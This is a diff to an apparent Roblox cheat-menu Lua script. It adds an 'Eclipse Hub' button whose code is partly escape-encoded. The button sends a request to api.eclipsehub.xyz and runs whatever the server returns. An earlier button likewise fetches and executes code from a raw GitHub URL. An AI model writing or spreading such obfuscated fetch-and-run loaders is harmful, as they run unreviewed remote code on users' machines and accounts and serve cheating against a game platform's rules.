@@ -120,3 +120,11 @@ end)
 MainSection:NewButton("Keyboard Mobile/Android", "For phones", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
 end)
+
+local MainSection = Main:NewSection("Hub Script")
+
+
+MainSection:NewButton("Eclipse Hub 0.96", "OP HUB I FOUND", function()
+getgenv().mainKey = "nil"
+
+local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
